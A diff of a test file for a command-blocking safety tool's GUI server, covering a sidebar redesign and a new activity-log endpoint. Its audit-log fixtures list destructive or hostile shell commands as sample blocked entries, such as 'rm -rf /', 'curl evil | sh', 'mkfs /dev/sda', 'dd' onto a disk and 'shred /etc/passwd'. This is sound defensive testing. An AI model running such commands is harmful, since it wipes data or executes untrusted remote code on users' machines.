@@ -1,5 +1,6 @@
 import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
 import {
+  appendFileSync,
   chmodSync,
   existsSync,
   mkdirSync,
@@ -17,6 +18,7 @@ import {
   starRepo,
   userHasStarredRepo,
 } from '@/bin/gui';
+import { writeJsonlFixture } from '../helpers';
 
 interface PolicyApiResponse {
   exists: boolean;
@@ -41,6 +43,22 @@ interface StarContextApiResponse {
   starred: boolean | null;
   starCount: number | null;
   blockedTotal: number;
+}
+
+interface ActivityApiResponse {
+  days: number;
+  logsDir: string | null;
+  totalBlockedAllTime: number;
+  totalInWindow: number;
+  truncated: boolean;
+  counts: {
+    blocked: number;
+    allowed: number;
+    sessions: number;
+    agents: Record<string, number>;
+    blockedByDay: number[];
+  };
+  entries: { ts: string; command: string }[];
 }
 
 const DEFAULT_POLICY_BODY = {
@@ -86,14 +104,99 @@ describe('policy GUI server', () => {
       const html = await response.text();
 
       expect(response.headers.get('content-type')).toBe('text/html; charset=utf-8');
-      expect(html).toContain('<title>CC Safety Net Policy</title>');
+      expect(html).toContain('<title>CC Safety Net</title>');
       expect(html).toContain(`const token = ${JSON.stringify(server.token)};`);
       expect(html).toContain('cc-safety-net-gui-custom-css');
       expect(html).toContain('role="status"');
       expect(html).toContain('aria-live="polite"');
       expect(html).toContain('id="app-status"');
-      expect(html.indexOf('id="reset"')).toBeLessThan(html.indexOf('id="app-status"'));
-      expect(html).toContain('.app-status {\n  flex: 1 0 100%;');
+      // Sidebar shell with hash-routed views; the global status bar sits in the topbar.
+      expect(html).toContain('<aside class="sidebar">');
+      expect(html).toContain('<nav class="sidenav" aria-label="Sections">');
+      expect(html).toContain('data-nav="overview"');
+      expect(html).toContain('data-nav="activity"');
+      expect(html).toContain('data-nav="policy"');
+      expect(html).toContain('data-nav="settings"');
+      expect(html).toContain('<link rel="icon" href="data:image/svg+xml,');
+      expect(html).toContain('title="Overview"');
+      expect(html).toContain('title="Activity"');
+      expect(html).toContain('title="Policy"');
+      expect(html).toContain('title="Settings"');
+      expect(html).toContain('.sr-only-collapse');
+      expect(html).toContain('@media (max-width: 900px)');
+      expect(html).toContain('repeat(2, minmax(0, 1fr))');
+      expect(html).toContain('<section class="view" data-view="overview">');
+      expect(html).toContain('<section class="view" data-view="activity" hidden>');
+      expect(html).toContain('<section class="view" data-view="policy" hidden>');
+      expect(html).toContain('<section class="view" data-view="settings" hidden>');
+      expect(html).toContain("const viewNames = ['overview', 'activity', 'policy', 'settings'];");
+      expect(html).toContain("window.addEventListener('hashchange', applyView);");
+      expect(html).toContain('<header class="topbar">');
+      expect(html.indexOf('id="app-status"')).toBeLessThan(html.indexOf('id="save"'));
+      expect(html.indexOf('id="save"')).toBeLessThan(html.indexOf('id="reset"'));
+      expect(html).toContain('.topbar {\n  position: sticky;');
+      // Topbar merges the view title, status chip, and Save; title tracks the route.
+      expect(html).toContain('id="topbar-title"');
+      expect(html).toContain('const viewTitles = {');
+      expect(html).toContain('.topbar-row {');
+      expect(html).toContain('document.title = `${viewTitles[view]} · CC Safety Net`;');
+      // Overview: stat tiles plus the recent-blocks preview backed by /api/activity.
+      expect(html).toContain('id="overview-tiles"');
+      expect(html).toContain('id="recent-blocks"');
+      expect(html).toContain('id="recent-blocks-sub"');
+      // The empty state keys on window counts, not the capped entry list (which can
+      // omit older blocks when the feed is truncated at 500 entries).
+      expect(html).toContain(
+        "qs('recent-blocks-sub').textContent =\n    activity.counts.blocked === 0",
+      );
+      expect(html).toContain("qs('recent-blocks').innerHTML =\n    activity.counts.blocked === 0");
+      expect(html).toContain(
+        '<a id="view-all-blocks" class="panel-head-action view-all-link" href="#activity">View all</a>',
+      );
+      // Activity: filterable audit feed.
+      expect(html).toContain('id="activity-days"');
+      expect(html).toContain('id="activity-refresh"');
+      expect(html).toContain('id="activity-search"');
+      expect(html).toContain('id="activity-decision"');
+      expect(html).toContain('id="activity-agents"');
+      expect(html).toContain('id="activity-feed"');
+      expect(html).toContain('id="activity-count"');
+      expect(html).toContain('requestJson(`/api/activity?days=${activityFilters.days}`)');
+      expect(html).toContain('const feedItemHtml = (entry) => {');
+      expect(html).toContain(
+        "const activityFilters = { days: 7, decision: 'all', agent: 'all', query: '' };",
+      );
+      expect(html).toContain('data-activity-chip=');
+      // Error badge for fail-closed guard failures (amber, still a deny).
+      expect(html).toContain('--warn-fg:');
+      expect(html).toContain('.decision-badge.error {');
+      expect(html).toContain(
+        "const badgeClass = entry.failureStage ? 'error' : deny ? 'deny' : 'allow';",
+      );
+      // Agent display names; filtering keeps the raw key via data-chip-value.
+      expect(html).toContain('const agentLabels = {');
+      expect(html).toContain("agentLabels[entry.agent || 'unknown'] ?? entry.agent");
+      expect(html).toContain('data-chip-value=');
+      // Clamp toggle for long feed commands.
+      expect(html).toContain('max-height: 7.2em');
+      expect(html).toContain('data-feed-toggle');
+      expect(html).toContain('Show more');
+      expect(html).toContain('.feed-command.expanded {');
+      // Day separators in the Activity feed.
+      expect(html).toContain('.feed-day-sep {');
+      expect(html).toContain('const dayLabel = (ts) => {');
+      // Blocks-per-day sparkline built from server counts only.
+      expect(html).toContain('const byDay = activity.counts.blockedByDay;');
+      expect(html).toContain('Blocked commands per day, most recent');
+      expect(html).toContain('<div class="spark-bar" aria-hidden="true"');
+      expect(html).toContain('id="view-all-blocks"');
+      // Settings: file locations, raw JSON, and the danger zone with reset.
+      expect(html).toContain('id="logs-path"');
+      expect(html).toContain('id="policy-path"');
+      expect(html).toContain('<h2>Danger zone</h2>');
+      expect(html.indexOf('id="theme-toggle"')).toBeGreaterThan(
+        html.indexOf('data-view="settings"'),
+      );
       expect(html).toContain('Unsaved changes. Click Save to apply.');
       expect(html).toContain('id="discard-changes"');
       expect(html).toContain('Discard unsaved changes?');
@@ -113,6 +216,11 @@ describe('policy GUI server', () => {
       expect(html).toContain('setDetailStatus(');
       expect(html).toContain('Destructive Command Protection');
       expect(html).toContain('Safety preset');
+      // Preset status dedupe: text only when customized, hidden when empty.
+      expect(html).toContain('#safety-preset-status:empty');
+      expect(html).toContain(
+        "qs('safety-preset-status').textContent = customized ? `${presetName()} · Customized` : '';",
+      );
       expect(html).toContain('Available in every preset');
       expect(html).toContain('Strict tier');
       expect(html).toContain('Paranoid tier');
@@ -147,7 +255,7 @@ describe('policy GUI server', () => {
       expect(html).toContain('const requestId = ++previewRequestId;');
       expect(html).toContain('if (requestId !== previewRequestId) return false;');
       expect(html).toContain(
-        'if (input.checked === preview.rules[ruleId].inheritedEnabled) delete draftPolicy.destructive_command_protection.overrides[ruleId];',
+        'if (input.checked === preview.rules[ruleId].inheritedEnabled)\n      delete draftPolicy.destructive_command_protection.overrides[ruleId];',
       );
       expect(html).toContain('const tierExpanded = new Map([');
       expect(html).toContain("['strict', false]");
@@ -176,8 +284,8 @@ describe('policy GUI server', () => {
       expect(html.indexOf('id="policy-search"')).toBeLessThan(html.indexOf('id="reset"'));
       expect(html).toContain('flex: 1 1 240px;');
       expect(html).toContain('max-width: none;');
-      expect(html).toContain('.titlewrap {\n    flex: none;');
-      expect(html).toContain('.appbar-search {\n    flex: none;');
+      expect(html).toContain('.view-search {\n    flex: none;');
+      expect(html).not.toContain('appbar');
       expect(html).not.toContain('id="destructive-command-search"');
       expect(html).not.toContain('id="secret-search"');
       expect(html).not.toContain('Search protections');
@@ -295,7 +403,7 @@ describe('policy GUI server', () => {
       expect(html).toContain('renderDestructiveCommands();');
       expect(html).toContain('renderSecretPatterns();');
       expect(html).toContain(
-        '<strong>${escapeHtml(rule.label)}</strong>\n                  <code class="rule-id">${escapeHtml(rule.id)}</code>',
+        '<strong>${escapeHtml(rule.label)}</strong>\n              <code class="rule-id">${escapeHtml(rule.id)}</code>',
       );
       expect(html).not.toContain(
         '<strong>${escapeHtml(rule.label)}</strong> <code class="rule-id">${escapeHtml(rule.id)}</code>',
@@ -314,7 +422,7 @@ describe('policy GUI server', () => {
       expect(html).toContain('id="allow-paths-content" hidden');
       expect(html).toContain('Raw JSON');
       expect(html).toContain(
-        '<div class="panel-head raw-json-head">\n        <div class="panel-title">\n          <h2>Raw JSON</h2>',
+        '<div class="panel-head raw-json-head">\n              <div class="panel-title">\n                <h2>Raw JSON</h2>',
       );
       expect(html).toContain('.raw-json-head {\n  flex-wrap: nowrap;');
       expect(html).toContain('.raw-json-head .panel-title {');
@@ -331,10 +439,11 @@ describe('policy GUI server', () => {
       expect(html).toContain('<span class="star-mechanism" id="star-mechanism" hidden>');
       expect(html).toContain('One click via your GitHub CLI. No redirect.');
       expect(html).toContain('<span id="star-slot"></span>');
-      expect(html.indexOf('id="star-row"')).toBeGreaterThan(html.indexOf('id="reset"'));
-      expect(html.indexOf('id="star-row"')).toBeLessThan(html.indexOf('id="app-status"'));
-      expect(html).toContain('<footer class="page-footer">');
-      expect(html.indexOf('<footer class="page-footer">')).toBeGreaterThan(html.indexOf('</main>'));
+      // The star CTA lives on the Overview view; repo links live in the sidebar footer.
+      expect(html.indexOf('id="star-row"')).toBeGreaterThan(html.indexOf('data-view="overview"'));
+      expect(html.indexOf('id="star-row"')).toBeLessThan(html.indexOf('data-view="activity"'));
+      expect(html).not.toContain('page-footer');
+      expect(html).toContain('<div class="sidebar-links">');
       expect(html).toContain(
         '<a href="https://github.com/kenryu42/cc-safety-net" target="_blank" rel="noopener">GitHub</a>',
       );
@@ -383,8 +492,15 @@ describe('policy GUI server', () => {
       expect(html).not.toContain('window.open(');
       expect(html).not.toContain("window.open('', '_blank')");
       expect(html).toContain("setAppStatus('Starred on GitHub', 'ok');");
-      expect(html).toContain('.page-footer {');
-      expect(html).toContain('.page-footer a {');
+      expect(html).toContain('.sidebar-links {');
+      expect(html).toContain('.sidebar-links a {');
+      expect(html).toContain('.tiles {');
+      expect(html).toContain('.tile {');
+      expect(html).toContain('.feed-item {');
+      expect(html).toContain('.feed-command {');
+      expect(html).toContain('.decision-badge {');
+      expect(html).toContain('.agent-badge {');
+      expect(html).toContain('button.chip {');
       expect(html).toContain('.star-row {');
       expect(html).toContain('.star-pitch {');
       expect(html).toContain('.star-mechanism {');
@@ -799,6 +915,178 @@ describe('policy GUI server', () => {
         },
       }),
     ).toEqual({ starred: null, starCount: null, blockedTotal: 2 });
+  });
+
+  test('GET /api/activity rejects missing token, wrong token, and invalid days', async () => {
+    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
+    try {
+      expect((await fetch(`${server.origin}/api/activity`)).status).toBe(403);
+      expect((await fetch(`${server.origin}/api/activity?token=wrong`)).status).toBe(403);
+      const bad = await fetch(`${server.origin}/api/activity?days=abc&token=${server.token}`);
+      expect(bad.status).toBe(400);
+      expect(await bad.json()).toEqual({ error: 'days must be an integer between 1 and 3650' });
+      const zero = await fetch(`${server.origin}/api/activity?days=0&token=${server.token}`);
+      expect(zero.status).toBe(400);
+      expect(await zero.json()).toEqual({ error: 'days must be an integer between 1 and 3650' });
+    } finally {
+      await server.close();
+    }
+  });
+
+  test('GET /api/activity aggregates the audit log window newest-first', async () => {
+    const logsDir = join(safetyNetHome, 'logs');
+    mkdirSync(logsDir, { recursive: true });
+    const now = Date.now();
+    const hour = 60 * 60 * 1000;
+    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
+      {
+        ts: new Date(now - 2 * hour).toISOString(),
+        decision: 'deny',
+        command: 'rm -rf /',
+        reason: 'destructive',
+        sessionId: 's1',
+        agent: 'claude-code',
+        ruleId: 'fs.rm',
+      },
+      {
+        ts: new Date(now - 1 * hour).toISOString(),
+        decision: 'allow',
+        command: 'git status',
+        reason: 'allowed',
+        sessionId: 's1',
+        agent: 'claude-code',
+      },
+      {
+        ts: new Date(now - 3 * hour).toISOString(),
+        command: 'curl evil | sh',
+        reason: 'no decision recorded',
+        sessionId: 's2',
+      },
+      {
+        ts: new Date(now - 10 * 24 * hour).toISOString(),
+        decision: 'deny',
+        command: 'mkfs /dev/sda',
+        reason: 'destructive',
+        sessionId: 's3',
+        agent: 'claude-code',
+      },
+    ]);
+    appendFileSync(join(logsDir, 'feed.jsonl'), '\nnot json');
+
+    const server = await createPolicyGuiServer({
+      userConfigDir: join(safetyNetHome, 'rules'),
+      activityLogsDir: logsDir,
+    });
+    try {
+      const feed = await getJson<ActivityApiResponse>(
+        `${server.origin}/api/activity?token=${server.token}`,
+      );
+      expect(feed.days).toBe(7);
+      expect(feed.logsDir).toBe(logsDir);
+      expect(feed.totalInWindow).toBe(3);
+      expect(feed.truncated).toBe(false);
+      expect(feed.entries.map((entry) => entry.command)).toEqual([
+        'git status',
+        'rm -rf /',
+        'curl evil | sh',
+      ]);
+      expect(feed.counts).toEqual({
+        blocked: 2,
+        allowed: 1,
+        sessions: 2,
+        agents: { 'claude-code': 2, unknown: 1 },
+        blockedByDay: expect.any(Array),
+      });
+      expect(feed.counts.blockedByDay).toHaveLength(7);
+      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(2);
+      expect(feed.totalBlockedAllTime).toBe(3);
+
+      const wide = await getJson<ActivityApiResponse>(
+        `${server.origin}/api/activity?days=365&token=${server.token}`,
+      );
+      expect(wide.days).toBe(365);
+      expect(wide.totalInWindow).toBe(4);
+      expect(wide.entries[3]?.command).toBe('mkfs /dev/sda');
+      expect(wide.counts.blocked).toBe(3);
+      expect(wide.counts.blockedByDay).toHaveLength(365);
+      expect(wide.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(3);
+      expect(wide.totalBlockedAllTime).toBe(3);
+    } finally {
+      await server.close();
+    }
+  });
+
+  test('GET /api/activity counts blocks beyond the 500-entry cap', async () => {
+    const logsDir = join(safetyNetHome, 'logs');
+    mkdirSync(logsDir, { recursive: true });
+    const now = Date.now();
+    const minute = 60 * 1000;
+    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
+      {
+        ts: new Date(now - 501 * minute).toISOString(),
+        decision: 'deny',
+        command: 'rm -rf /',
+        reason: 'destructive',
+      },
+      ...Array.from({ length: 501 }, (_, index) => ({
+        ts: new Date(now - index * minute).toISOString(),
+        decision: 'allow',
+        command: `git status ${index}`,
+        reason: 'allowed',
+      })),
+    ]);
+
+    const server = await createPolicyGuiServer({
+      userConfigDir: join(safetyNetHome, 'rules'),
+      activityLogsDir: logsDir,
+    });
+    try {
+      const feed = await getJson<ActivityApiResponse>(
+        `${server.origin}/api/activity?token=${server.token}`,
+      );
+      expect(feed.truncated).toBe(true);
+      expect(feed.totalInWindow).toBe(502);
+      expect(feed.entries).toHaveLength(500);
+      // The deny falls outside the capped entry list but must still be counted.
+      expect(feed.counts.blocked).toBe(1);
+      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(1);
+      expect(feed.entries.every((entry) => entry.command.startsWith('git status'))).toBe(true);
+    } finally {
+      await server.close();
+    }
+  });
+
+  test('GET /api/activity buckets blockedByDay by local calendar day', async () => {
+    const logsDir = join(safetyNetHome, 'logs');
+    mkdirSync(logsDir, { recursive: true });
+    const noon = new Date();
+    const at = (daysAgo: number) =>
+      new Date(noon.getFullYear(), noon.getMonth(), noon.getDate() - daysAgo, 12).toISOString();
+    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
+      {
+        ts: at(0),
+        decision: 'deny',
+        command: 'dd if=/dev/zero of=/dev/sda',
+        reason: 'destructive',
+      },
+      { ts: at(2), decision: 'deny', command: 'shred /etc/passwd', reason: 'destructive' },
+      { ts: at(0), decision: 'allow', command: 'ls -la', reason: 'allowed' },
+      { ts: at(10), decision: 'deny', command: 'chmod -R 000 /', reason: 'destructive' },
+    ]);
+
+    const server = await createPolicyGuiServer({
+      userConfigDir: join(safetyNetHome, 'rules'),
+      activityLogsDir: logsDir,
+    });
+    try {
+      const feed = await getJson<ActivityApiResponse>(
+        `${server.origin}/api/activity?days=5&token=${server.token}`,
+      );
+      expect(feed.counts.blockedByDay).toEqual([0, 0, 1, 0, 1]);
+      expect(feed.totalBlockedAllTime).toBe(3);
+    } finally {
+      await server.close();
+    }
   });
 
   test('userHasStarredRepo checks gh auth before starred state and maps exits', async () => {
